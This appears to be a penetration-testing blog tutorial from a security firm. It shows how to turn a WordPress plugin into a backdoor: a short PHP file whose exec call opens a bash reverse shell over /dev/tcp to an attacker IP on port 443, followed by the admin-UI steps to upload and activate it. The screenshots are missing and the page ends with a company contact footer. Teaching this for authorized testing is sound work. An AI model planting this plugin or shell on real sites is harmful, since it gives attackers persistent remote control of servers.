@@ -1,0 +1,106 @@
+Create the revshell.php using:
+```
+<?php
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: Vince Matteo
+* Author URI: http://www.sevenlayers.com
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'");
+?>
+```
+
+
+There's literally more comment than code.  
+
+If we were on the server itself, we could drop this PHP file into the /wp-content/plugin folder but if we were already on the server, we probably wouldn't need a reverse shell.  Perhaps for the sake of persistence?  Perhaps not.  I'm just tossing that out there as an FYI.
+
+In order to upload the shell as a plugin, we need to zip it up:
+
+
+
+
+
+
+Once we get it zipped, we move to the WordPress UI.  Under Plugins, we select Add New:
+
+
+
+
+
+
+Select Upload Plugin:
+
+
+
+
+
+
+We browse for our newly created plugin:
+
+
+
+
+
+
+We select Install Now:
+
+
+
+
+
+
+We select Activate Plugin:
+
+
+
+
+
+
+
+With our handler setup, we catch the shell:
+
+
+
+
+
+
+If at this point, we selected Plugins from the WordPress UI, we would see that the shell is not activated.  Technically it is activated, the shell is proof, but the shell is also hanging the completion of the Activate process.  If we kill the shell and then move into Plugins, we'd see:
+
+
+
+
+
+
+
+
+Our shell is activated.  
+
+If we Edit our Plugin, we'd see:
+
+
+
+
+
+
+
+This is about as basic as you can get.  It's definitely dirty in the sense that it consistently attempts to toss a shell every time you mess with the Plugins menu item.  This could be cleaned up and it could also be repurposed to do just about anything you can code in PHP.  
+
+
+{mosmap}
+09
+Contacts
+ADDRESS:
+Seven Layers, LLC.
+
+Phoenix Metro
+P.O. Box 7971
+Cave Creek, AZ 85327
+
+Tel: 877-468-0911
+sevenlayers © 2024 Privacy Policy
